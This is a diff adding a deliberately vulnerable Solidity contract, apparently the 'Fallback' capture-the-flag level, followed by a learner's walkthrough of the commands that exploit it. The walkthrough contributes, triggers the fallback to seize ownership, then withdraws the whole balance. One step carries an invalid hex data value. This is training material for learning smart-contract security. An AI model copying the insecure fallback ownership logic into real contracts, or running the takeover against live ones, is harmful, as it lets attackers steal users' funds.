@@ -1,0 +1,60 @@
+pragma solidity ^0.4.18;
+
+import 'zeppelin-solidity/contracts/ownership/Ownable.sol';
+import 'openzeppelin-solidity/contracts/math/SafeMath.sol';
+
+contract Fallback is Ownable {
+  
+  using SafeMath for uint256;
+  mapping(address => uint) public contributions;
+
+  function Fallback() public {
+    contributions[msg.sender] = 1000 * (1 ether);
+  }
+
+  function contribute() public payable {
+    require(msg.value < 0.001 ether);
+    contributions[msg.sender] = contributions[msg.sender].add(msg.value);
+    if(contributions[msg.sender] > contributions[owner]) {
+      owner = msg.sender;
+    }
+  }
+
+  function getContribution() public view returns (uint) {
+    return contributions[msg.sender];
+  }
+
+  function withdraw() public onlyOwner {
+    owner.transfer(this.balance);
+  }
+
+  function() payable public {
+    require(msg.value > 0 && contributions[msg.sender] > 0);
+    owner = msg.sender;
+  }
+}
+
+Following the source code above and 
+Reading through the instruction provided:
+
+it requires that I make contribution to the Conntract, this was done using 
+await contract.contribute({from:player, value: toWei(0.0004)}) 
+
+Checked validity of my contribution using:
+await contract.getContribution()
+
+
+checked ownership using:
+contract.owner() of which its returned value is not the saame as player
+
+claiming ownership:
+To claim owner ship, I need to interact with the contract's fallback:
+sendTransaction({from:player, to:instance, value: toWei(0.0004), data:"0xoeor"}) 
+
+validating ownership:
+await contract.owner() returned value is same as player value
+
+Emptying the contract:
+await contract.withdraw()
+
+
